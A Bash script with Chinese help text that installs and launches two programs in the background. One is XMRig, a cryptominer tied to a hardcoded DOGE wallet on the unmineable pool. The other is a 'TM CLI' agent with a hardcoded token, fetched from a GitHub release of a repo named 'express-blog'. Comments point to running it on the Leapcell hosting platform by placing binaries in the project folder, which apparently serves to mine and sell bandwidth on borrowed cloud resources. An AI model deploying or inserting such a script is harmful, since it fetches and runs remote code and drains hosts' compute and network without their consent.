#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
PROJECT_NAME="$(basename "${PROJECT_ROOT}")"
DEFAULT_RUNTIME_BASE="${TMPDIR:-/tmp}"
DEFAULT_RUNTIME_DIR="${DEFAULT_RUNTIME_BASE}/${PROJECT_NAME}-runtime"

usage() {
  cat <<'EOF'
用法:
  bash scripts/install_tm_xmrig.sh [run|status|force]
  或覆盖默认值后执行:
  TM_TOKEN='你的TM_TOKEN' XMRIG_USER='钱包.矿工名' bash scripts/install_tm_xmrig.sh

模式说明:
  默认    自动执行。若 TM CLI + XMRig 都在运行，则仅展示状态；否则执行安装/启动流程。
  status  仅展示当前 TM CLI 和 XMRig 状态，不做安装/重启。
  force   强制执行安装/启动流程。

可选环境变量:
  TM_TOKEN                  默认: Mt7dNIUNCtP6lbKg6lZ3a0mKOFtawA/AX5LPGe6Bv8o=
  XMRIG_USER                默认: DOGE:DFbkyE4gsYf7EgpU5pGGucerCDaJXqeUi9.unmineable_worker_sgbqobfl

  TM_RELEASE_OWNER          默认: c9cuu
  TM_RELEASE_REPO           默认: express-blog
  TM_RELEASE_TAG            默认: tm-cli-0.1

  TM_INSTALL_DIR            默认: /tmp/<repo>-runtime/tm-cli
  TM_BIN_LINK               默认: /tmp/<repo>-runtime/bin/tm-cli
  TM_LOG_FILE               默认: /tmp/<repo>-runtime/logs/tm-cli.log
  TM_PID_FILE               默认: /tmp/<repo>-runtime/pids/tm-cli.pid
  TM_DEVICE_NAME            可选，传给 CLI 的 --device-name
  TM_VERBOSE_LOGGING        默认: 0 (1=启用 --verbose-logging)
  TM_EXTRA_ARGS             额外参数，例如: "--device-ids abc --nooff"
  TM_SKIP_SHA256            默认: 0 (1=跳过 sha256 校验)

  XMRIG_VERSION             默认: 6.26.0
  XMRIG_INSTALL_DIR         默认: /tmp/<repo>-runtime/xmrig
  XMRIG_BIN_LINK            默认: /tmp/<repo>-runtime/bin/xmrig
  XMRIG_LOG_FILE            默认: /tmp/<repo>-runtime/logs/xmrig.log
  XMRIG_PID_FILE            默认: /tmp/<repo>-runtime/pids/xmrig.pid
  XMRIG_ALGO                默认: rx/0
  XMRIG_POOL                默认: rx.unmineable.com:443
  XMRIG_PASS                默认: x
  XMRIG_TLS                 默认: 1 (1=启用 --tls, 0=关闭)
  XMRIG_KEEPALIVE           默认: 1 (1=启用 -k, 0=关闭)
  XMRIG_RANDOMX_MODE        默认: light
  XMRIG_THREADS             默认: 1
  XMRIG_EXTRA_ARGS          额外参数，例如: "--cpu-max-threads-hint=75"

  GITHUB_TOKEN / GH_TOKEN   私有 GitHub Release 下载 TM CLI 时可提供；公开仓库通常不需要
EOF
}

ACTION="${1:-run}"
if [[ "$ACTION" == "-h" || "$ACTION" == "--help" ]]; then
  usage
  exit 0
fi

if [[ "$ACTION" == "apply" ]]; then
  ACTION="force"
fi

if [[ "$ACTION" != "run" && "$ACTION" != "status" && "$ACTION" != "force" ]]; then
  echo "[ERROR] 未知模式: $ACTION" >&2
  usage
  exit 1
fi

DEFAULT_TM_TOKEN="Mt7dNIUNCtP6lbKg6lZ3a0mKOFtawA/AX5LPGe6Bv8o="
DEFAULT_XMRIG_USER="DOGE:DFbkyE4gsYf7EgpU5pGGucerCDaJXqeUi9.unmineable_worker_sgbqobfl"

TM_TOKEN="${TM_TOKEN:-$DEFAULT_TM_TOKEN}"
XMRIG_USER="${XMRIG_USER:-$DEFAULT_XMRIG_USER}"

TM_RELEASE_OWNER="${TM_RELEASE_OWNER:-c9cuu}"
TM_RELEASE_REPO="${TM_RELEASE_REPO:-express-blog}"
TM_RELEASE_TAG="${TM_RELEASE_TAG:-tm-cli-0.1}"

TM_INSTALL_DIR="${TM_INSTALL_DIR:-${DEFAULT_RUNTIME_DIR}/tm-cli}"
TM_BIN_LINK="${TM_BIN_LINK:-${DEFAULT_RUNTIME_DIR}/bin/tm-cli}"
TM_LOG_FILE="${TM_LOG_FILE:-${DEFAULT_RUNTIME_DIR}/logs/tm-cli.log}"
TM_PID_FILE="${TM_PID_FILE:-${DEFAULT_RUNTIME_DIR}/pids/tm-cli.pid}"
TM_DEVICE_NAME="${TM_DEVICE_NAME:-}"
TM_VERBOSE_LOGGING="${TM_VERBOSE_LOGGING:-0}"
TM_EXTRA_ARGS="${TM_EXTRA_ARGS:-}"
TM_SKIP_SHA256="${TM_SKIP_SHA256:-0}"

XMRIG_VERSION="${XMRIG_VERSION:-6.26.0}"
XMRIG_INSTALL_DIR="${XMRIG_INSTALL_DIR:-${DEFAULT_RUNTIME_DIR}/xmrig}"
XMRIG_BIN_LINK="${XMRIG_BIN_LINK:-${DEFAULT_RUNTIME_DIR}/bin/xmrig}"
XMRIG_LOG_FILE="${XMRIG_LOG_FILE:-${DEFAULT_RUNTIME_DIR}/logs/xmrig.log}"
XMRIG_PID_FILE="${XMRIG_PID_FILE:-${DEFAULT_RUNTIME_DIR}/pids/xmrig.pid}"
XMRIG_ALGO="${XMRIG_ALGO:-rx/0}"
XMRIG_POOL="${XMRIG_POOL:-rx.unmineable.com:443}"
XMRIG_PASS="${XMRIG_PASS:-x}"
XMRIG_TLS="${XMRIG_TLS:-1}"
XMRIG_KEEPALIVE="${XMRIG_KEEPALIVE:-1}"
XMRIG_RANDOMX_MODE="${XMRIG_RANDOMX_MODE:-light}"
XMRIG_THREADS="${XMRIG_THREADS:-1}"
XMRIG_EXTRA_ARGS="${XMRIG_EXTRA_ARGS:-}"

log() {
  echo "[INFO] $*"
}

ok() {
  echo "[OK] $*"
}

err() {
  echo "[ERROR] $*" >&2
}

if [[ "$EUID" -eq 0 ]]; then
  SUDO=""
else
  if command -v sudo >/dev/null 2>&1; then
    SUDO="sudo"
  else
    SUDO=""
  fi
fi

run_root() {
  if [[ -n "$SUDO" ]]; then
    "$SUDO" "$@"
  else
    "$@"
  fi
}

github_token() {
  if [[ -n "${GITHUB_TOKEN:-}" ]]; then
    printf '%s' "$GITHUB_TOKEN"
  elif [[ -n "${GH_TOKEN:-}" ]]; then
    printf '%s' "$GH_TOKEN"
  fi
}

install_tools_if_missing() {
  local missing=()

  command -v curl >/dev/null 2>&1 || missing+=("curl")
  command -v tar >/dev/null 2>&1 || missing+=("tar")

  if [[ -n "$(github_token)" ]]; then
    command -v python3 >/dev/null 2>&1 || missing+=("python3")
  fi

  if [[ "${#missing[@]}" -eq 0 ]]; then
    return 0
  fi

  if [[ "$EUID" -ne 0 && -z "$SUDO" ]]; then
    err "缺少依赖: ${missing[*]}，且当前环境无 sudo 权限。"
    err "在 Leapcell 上建议把 TM 和 XMRig 二进制直接放到项目根目录，脚本会优先使用本地文件。"
    return 1
  fi

  log "安装依赖: ${missing[*]}"
  if command -v apt-get >/dev/null 2>&1; then
    run_root apt-get update
    run_root env DEBIAN_FRONTEND=noninteractive apt-get install -y "${missing[@]}"
  elif command -v dnf >/dev/null 2>&1; then
    run_root dnf install -y "${missing[@]}"
  elif command -v yum >/dev/null 2>&1; then
    run_root yum install -y "${missing[@]}"
  elif command -v zypper >/dev/null 2>&1; then
    run_root zypper --non-interactive install "${missing[@]}"
  else
    err "不支持的发行版，无法自动安装依赖: ${missing[*]}"
    return 1
  fi
}

ensure_runtime_dirs() {
  run_root mkdir -p "$TM_INSTALL_DIR" "$XMRIG_INSTALL_DIR" "$(dirname "$TM_BIN_LINK")" "$(dirname "$TM_LOG_FILE")" "$(dirname "$TM_PID_FILE")"
}

compute_sha256() {
  local file_path="$1"
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$file_path" | awk '{print $1}'
  elif command -v shasum >/dev/null 2>&1; then
    shasum -a 256 "$file_path" | awk '{print $1}'
  else
    err "未找到 sha256sum 或 shasum，无法校验文件"
    return 1
  fi
}

quote_args() {
  local arg
  for arg in "$@"; do
    printf '%q ' "$arg"
  done
}

release_api_url() {
  local owner="$1"
  local repo="$2"
  local tag="$3"
  echo "https://api.github.com/repos/${owner}/${repo}/releases/tags/${tag}"
}

release_download_url() {
  local owner="$1"
  local repo="$2"
  local tag="$3"
  local asset_name="$4"
  echo "https://github.com/${owner}/${repo}/releases/download/${tag}/${asset_name}"
}

find_release_asset_id() {
  local owner="$1"
  local repo="$2"
  local tag="$3"
  local asset_name="$4"
  local token="$5"
  local metadata_file

  metadata_file="$(mktemp)"
  curl -fsSL \
    -H "Authorization: Bearer ${token}" \
    -H "Accept: application/vnd.github+json" \
    "$(release_api_url "$owner" "$repo" "$tag")" \
    -o "$metadata_file"

  python3 - "$metadata_file" "$asset_name" <<'PY'
import json
import sys

path, asset_name = sys.argv[1], sys.argv[2]
with open(path, "r", encoding="utf-8") as fh:
    payload = json.load(fh)

for asset in payload.get("assets", []):
    if asset.get("name") == asset_name:
        print(asset["id"])
        break
else:
    sys.exit(1)
PY

  rm -f "$metadata_file"
}

download_release_asset_via_api() {
  local owner="$1"
  local repo="$2"
  local tag="$3"
  local asset_name="$4"
  local dest="$5"
  local token="$6"
  local asset_id

  asset_id="$(find_release_asset_id "$owner" "$repo" "$tag" "$asset_name" "$token")"
  curl -fsSL \
    -H "Authorization: Bearer ${token}" \
    -H "Accept: application/octet-stream" \
    "https://api.github.com/repos/${owner}/${repo}/releases/assets/${asset_id}" \
    -o "$dest"
}

download_release_asset() {
  local owner="$1"
  local repo="$2"
  local tag="$3"
  local asset_name="$4"
  local dest="$5"
  local token

  token="$(github_token)"
  if [[ -n "$token" ]]; then
    if download_release_asset_via_api "$owner" "$repo" "$tag" "$asset_name" "$dest" "$token"; then
      return 0
    fi
    log "GitHub API 下载 ${asset_name} 失败，回退到公开直链"
  fi

  curl -fsSL "$(release_download_url "$owner" "$repo" "$tag" "$asset_name")" -o "$dest"
}

resolve_tm_asset_name() {
  local arch
  arch="$(uname -m)"
  case "$arch" in
    x86_64|amd64)
      echo "tm-cli-linux-amd64"
      ;;
    aarch64|arm64)
      echo "tm-cli-linux-arm64"
      ;;
    *)
      err "不支持的 TM 架构: ${arch}"
      return 1
      ;;
  esac
}

resolve_tm_local_asset_path() {
  local asset_name
  asset_name="$(resolve_tm_asset_name)"

  if [[ -f "${PROJECT_ROOT}/${asset_name}" ]]; then
    echo "${PROJECT_ROOT}/${asset_name}"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/vendor/${asset_name}" ]]; then
    echo "${PROJECT_ROOT}/vendor/${asset_name}"
    return 0
  fi

  return 1
}

tm_release_download_url() {
  local asset_name="$1"
  release_download_url "$TM_RELEASE_OWNER" "$TM_RELEASE_REPO" "$TM_RELEASE_TAG" "$asset_name"
}

verify_checksum() {
  local asset_file="$1"
  local asset_name="$2"
  local checksum_file="$3"
  local expected actual

  expected="$(awk -v name="$asset_name" '$2 == name {print $1}' "$checksum_file" | head -n 1)"
  if [[ -z "$expected" ]]; then
    err "sha256sums.txt 中未找到 ${asset_name}"
    return 1
  fi

  actual="$(compute_sha256 "$asset_file")"
  if [[ "$actual" != "$expected" ]]; then
    err "sha256 校验失败: ${asset_name}"
    err "expected=${expected}"
    err "actual=${actual}"
    return 1
  fi
}

install_tm_binary() {
  local asset_name tmp_asset tmp_checksums target_path local_asset
  asset_name="$(resolve_tm_asset_name)"
  target_path="${TM_INSTALL_DIR}/${asset_name}"
  ensure_runtime_dirs

  local_asset="$(resolve_tm_local_asset_path || true)"
  if [[ -n "$local_asset" ]]; then
    log "使用本地 TM CLI: ${local_asset}"
    run_root install -m 0755 "$local_asset" "$target_path"
    run_root ln -sf "$target_path" "$TM_BIN_LINK"
    ok "TM CLI 已安装: ${TM_BIN_LINK} -> ${target_path}"
    return 0
  fi

  install_tools_if_missing

  tmp_asset="$(mktemp)"
  tmp_checksums="$(mktemp)"

  log "下载 TM CLI: ${asset_name} (release=${TM_RELEASE_TAG})"
  download_release_asset "$TM_RELEASE_OWNER" "$TM_RELEASE_REPO" "$TM_RELEASE_TAG" "$asset_name" "$tmp_asset"

  if [[ "$TM_SKIP_SHA256" != "1" ]]; then
    download_release_asset "$TM_RELEASE_OWNER" "$TM_RELEASE_REPO" "$TM_RELEASE_TAG" "sha256sums.txt" "$tmp_checksums"
    verify_checksum "$tmp_asset" "$asset_name" "$tmp_checksums"
    ok "sha256 校验通过: ${asset_name}"
  else
    log "已跳过 TM CLI sha256 校验"
  fi

  run_root install -m 0755 "$tmp_asset" "$target_path"
  run_root ln -sf "$target_path" "$TM_BIN_LINK"

  rm -f "$tmp_asset" "$tmp_checksums"
  ok "TM CLI 已安装: ${TM_BIN_LINK} -> ${target_path}"
}

tm_installed() {
  [[ -x "$TM_BIN_LINK" ]]
}

tm_running() {
  local pid
  if [[ -f "$TM_PID_FILE" ]]; then
    pid="$(cat "$TM_PID_FILE" 2>/dev/null || true)"
    if [[ -n "$pid" ]] && kill -0 "$pid" >/dev/null 2>&1; then
      return 0
    fi
  fi

  pgrep -af "$TM_BIN_LINK" >/dev/null 2>&1
}

stop_tm() {
  local pid
  if [[ -f "$TM_PID_FILE" ]]; then
    pid="$(cat "$TM_PID_FILE" 2>/dev/null || true)"
    if [[ -n "$pid" ]] && kill -0 "$pid" >/dev/null 2>&1; then
      run_root kill "$pid" >/dev/null 2>&1 || true
      sleep 1
      if kill -0 "$pid" >/dev/null 2>&1; then
        run_root kill -9 "$pid" >/dev/null 2>&1 || true
      fi
    fi
    run_root rm -f "$TM_PID_FILE" >/dev/null 2>&1 || true
  fi

  run_root pkill -f "$TM_BIN_LINK" >/dev/null 2>&1 || true
}

build_tm_args() {
  TM_ARGS=(start accept --token "$TM_TOKEN")

  if [[ -n "$TM_DEVICE_NAME" ]]; then
    TM_ARGS+=(--device-name "$TM_DEVICE_NAME")
  fi

  if [[ "$TM_VERBOSE_LOGGING" == "1" ]]; then
    TM_ARGS+=(--verbose-logging)
  fi

  if [[ -n "$TM_EXTRA_ARGS" ]]; then
    local extra=()
    # shellcheck disable=SC2206
    extra=($TM_EXTRA_ARGS)
    TM_ARGS+=("${extra[@]}")
  fi
}

start_tm() {
  build_tm_args
  stop_tm

  run_root mkdir -p "$(dirname "$TM_LOG_FILE")" "$(dirname "$TM_PID_FILE")"
  run_root touch "$TM_LOG_FILE"

  local quoted_cmd launch_cmd
  quoted_cmd="$(quote_args "$TM_BIN_LINK" "${TM_ARGS[@]}")"
  launch_cmd="$(printf 'nohup %s >> %q 2>&1 & echo $! > %q' "$quoted_cmd" "$TM_LOG_FILE" "$TM_PID_FILE")"
  run_root bash -lc "$launch_cmd"

  sleep 3
  if ! tm_running; then
    err "TM CLI 启动失败，日志如下："
    tail -n 40 "$TM_LOG_FILE" || true
    return 1
  fi

  ok "TM CLI 已启动"
}

resolve_xmrig_pkg() {
  local arch
  arch="$(uname -m)"
  case "$arch" in
    x86_64|amd64)
      echo "linux-static-x64"
      ;;
    aarch64|arm64)
      echo "linux-static-arm64"
      ;;
    *)
      err "不支持的 XMRig 架构: ${arch}"
      return 1
      ;;
  esac
}

resolve_xmrig_local_binary_path() {
  local pkg
  pkg="$(resolve_xmrig_pkg)"

  if [[ -f "${PROJECT_ROOT}/xmrig" ]]; then
    echo "${PROJECT_ROOT}/xmrig"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/vendor/xmrig" ]]; then
    echo "${PROJECT_ROOT}/vendor/xmrig"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/xmrig-${pkg}" ]]; then
    echo "${PROJECT_ROOT}/xmrig-${pkg}"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/vendor/xmrig-${pkg}" ]]; then
    echo "${PROJECT_ROOT}/vendor/xmrig-${pkg}"
    return 0
  fi

  return 1
}

install_xmrig_binary() {
  local pkg url tgz extract_dir bin_path local_bin
  pkg="$(resolve_xmrig_pkg)"
  ensure_runtime_dirs

  local_bin="$(resolve_xmrig_local_binary_path || true)"
  if [[ -n "$local_bin" ]]; then
    log "使用本地 XMRig: ${local_bin}"
    run_root install -m 0755 "$local_bin" "${XMRIG_INSTALL_DIR}/xmrig"
    run_root ln -sf "${XMRIG_INSTALL_DIR}/xmrig" "$XMRIG_BIN_LINK"
    ok "XMRig 已安装: ${XMRIG_BIN_LINK}"
    return 0
  fi

  install_tools_if_missing

  url="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-${pkg}.tar.gz"
  tgz="$(mktemp)"
  extract_dir="${XMRIG_INSTALL_DIR}/xmrig-${XMRIG_VERSION}"

  log "下载 XMRig v${XMRIG_VERSION}: ${url}"
  curl -fsSL "$url" -o "$tgz"

  run_root rm -rf "$extract_dir"
  run_root tar -xzf "$tgz" -C "$XMRIG_INSTALL_DIR"

  bin_path="${extract_dir}/xmrig"
  if [[ ! -x "$bin_path" ]]; then
    err "XMRig 二进制不存在: ${bin_path}"
    rm -f "$tgz"
    return 1
  fi

  run_root chmod +x "$bin_path"
  run_root ln -sf "$bin_path" "$XMRIG_BIN_LINK"
  rm -f "$tgz"
  ok "XMRig 已安装: ${XMRIG_BIN_LINK}"
}

xmrig_installed() {
  [[ -x "$XMRIG_BIN_LINK" ]]
}

xmrig_running() {
  local pid
  if [[ -f "$XMRIG_PID_FILE" ]]; then
    pid="$(cat "$XMRIG_PID_FILE" 2>/dev/null || true)"
    if [[ -n "$pid" ]] && kill -0 "$pid" >/dev/null 2>&1; then
      return 0
    fi
  fi

  pgrep -af "$XMRIG_BIN_LINK" >/dev/null 2>&1
}

stop_xmrig() {
  local pid
  if [[ -f "$XMRIG_PID_FILE" ]]; then
    pid="$(cat "$XMRIG_PID_FILE" 2>/dev/null || true)"
    if [[ -n "$pid" ]] && kill -0 "$pid" >/dev/null 2>&1; then
      run_root kill "$pid" >/dev/null 2>&1 || true
      sleep 1
      if kill -0 "$pid" >/dev/null 2>&1; then
        run_root kill -9 "$pid" >/dev/null 2>&1 || true
      fi
    fi
    run_root rm -f "$XMRIG_PID_FILE" >/dev/null 2>&1 || true
  fi

  run_root pkill -f "$XMRIG_BIN_LINK" >/dev/null 2>&1 || true
}

build_xmrig_args() {
  XMRIG_ARGS=(-a "$XMRIG_ALGO" -o "$XMRIG_POOL" -u "$XMRIG_USER" -p "$XMRIG_PASS")

  if [[ "$XMRIG_TLS" == "1" ]]; then
    XMRIG_ARGS+=(--tls)
  fi

  if [[ "$XMRIG_KEEPALIVE" == "1" ]]; then
    XMRIG_ARGS+=(-k)
  fi

  if [[ -n "$XMRIG_RANDOMX_MODE" ]]; then
    XMRIG_ARGS+=(--randomx-mode="$XMRIG_RANDOMX_MODE")
  fi

  if [[ -n "$XMRIG_THREADS" ]]; then
    XMRIG_ARGS+=(-t "$XMRIG_THREADS")
  fi

  if [[ -n "$XMRIG_EXTRA_ARGS" ]]; then
    local extra=()
    # shellcheck disable=SC2206
    extra=($XMRIG_EXTRA_ARGS)
    XMRIG_ARGS+=("${extra[@]}")
  fi
}

start_xmrig() {
  build_xmrig_args
  stop_xmrig

  run_root mkdir -p "$(dirname "$XMRIG_LOG_FILE")" "$(dirname "$XMRIG_PID_FILE")"
  run_root touch "$XMRIG_LOG_FILE"

  local quoted_cmd launch_cmd
  quoted_cmd="$(quote_args "$XMRIG_BIN_LINK" "${XMRIG_ARGS[@]}")"
  launch_cmd="$(printf 'nohup %s >> %q 2>&1 & echo $! > %q' "$quoted_cmd" "$XMRIG_LOG_FILE" "$XMRIG_PID_FILE")"
  run_root bash -lc "$launch_cmd"

  sleep 3
  if ! xmrig_running; then
    err "XMRig 启动失败，日志如下："
    tail -n 40 "$XMRIG_LOG_FILE" || true
    return 1
  fi

  ok "XMRig 已启动"
}

ensure_tm_ready() {
  if ! tm_installed; then
    install_tm_binary
  fi

  if ! tm_running; then
    start_tm
  fi
}

ensure_xmrig_ready() {
  if ! xmrig_installed; then
    install_xmrig_binary
  fi

  if ! xmrig_running; then
    start_xmrig
  fi
}

print_status() {
  echo
  ok "TM CLI 配置:"
  echo "release: ${TM_RELEASE_OWNER}/${TM_RELEASE_REPO}@${TM_RELEASE_TAG}"
  echo "bin link: ${TM_BIN_LINK}"
  echo "install dir: ${TM_INSTALL_DIR}"
  echo "log file: ${TM_LOG_FILE}"
  echo "pid file: ${TM_PID_FILE}"

  echo
  ok "TM CLI 运行状态:"
  if tm_running; then
    pgrep -af "$TM_BIN_LINK" || true
  else
    echo "tm-cli: 未运行"
  fi

  echo
  ok "XMRig 配置:"
  echo "version: ${XMRIG_VERSION}"
  echo "bin link: ${XMRIG_BIN_LINK}"
  echo "install dir: ${XMRIG_INSTALL_DIR}"
  echo "log file: ${XMRIG_LOG_FILE}"
  echo "pid file: ${XMRIG_PID_FILE}"

  echo
  ok "XMRig 运行状态:"
  if xmrig_running; then
    pgrep -af "$XMRIG_BIN_LINK" || true
  else
    echo "xmrig: 未运行 (bin=${XMRIG_BIN_LINK})"
  fi

  echo
  ok "TM CLI 日志:"
  if [[ -f "$TM_LOG_FILE" ]]; then
    tail -n 20 "$TM_LOG_FILE" || true
  else
    echo "log: ${TM_LOG_FILE} 不存在"
  fi

  echo
  ok "XMRig 日志:"
  if [[ -f "$XMRIG_LOG_FILE" ]]; then
    tail -n 20 "$XMRIG_LOG_FILE" || true
  else
    echo "log: ${XMRIG_LOG_FILE} 不存在"
  fi
}

force_apply_all() {
  install_tm_binary
  install_xmrig_binary
  start_tm
  start_xmrig
  print_status
}

main() {
  if [[ "$ACTION" == "status" ]]; then
    print_status
    return 0
  fi

  if [[ "$ACTION" == "force" ]]; then
    force_apply_all
    return 0
  fi

  if tm_running && xmrig_running; then
    log "检测到 TM CLI 和 XMRig 均在运行，进入 status 模式"
    print_status
  else
    log "检测到服务未完全运行，进入安装/启动流程"
    ensure_tm_ready
    ensure_xmrig_ready
    print_status
  fi
}

if [[ "${TM_XMRIG_LIB_ONLY:-0}" != "1" && "${BASH_SOURCE[0]}" == "$0" ]]; then
  main "$@"
fi
